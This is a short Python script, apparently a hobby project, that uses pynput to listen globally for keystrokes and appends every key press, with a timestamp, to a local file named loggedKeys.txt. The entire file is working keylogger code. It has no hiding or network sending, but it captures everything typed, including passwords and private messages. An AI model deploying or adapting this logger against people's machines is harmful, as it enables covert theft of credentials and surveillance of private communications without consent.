import os
import time
from pynput.keyboard import Listener, Key

path = "loggedKeys.txt"
pressed = {Key.shift_l: False, Key.shift_r: False}


def write_file(key):
    with open(path, "a") as file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        key_str = str(key).replace("'", "")

        if key == Key.backspace:
            file.write(f"[{timestamp}] Backspace\n")
        elif key == Key.enter:
            file.write(f"[{timestamp}] Enter\n")
        elif key == Key.space:
            file.write(f"[{timestamp}] Space\n")
        elif key == Key.caps_lock:
            file.write(f"[{timestamp}] Caps Lock\n")
        elif key == Key.shift_l or key == Key.shift_r:
            file.write(f"[{timestamp}] Shift\n")
        elif isinstance(key, Key):
            file.write(f"[{timestamp}] {key_str.replace('Key.','')}\n")
        else:
            file.write(f"[{timestamp}] {key_str}\n")


def on_release(key):
    if key in pressed:
        pressed[key] = False


def on_press(key):
    if key in pressed:
        if not pressed[key]:
            write_file(key)
        pressed[key] = True
    else:
        write_file(key)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
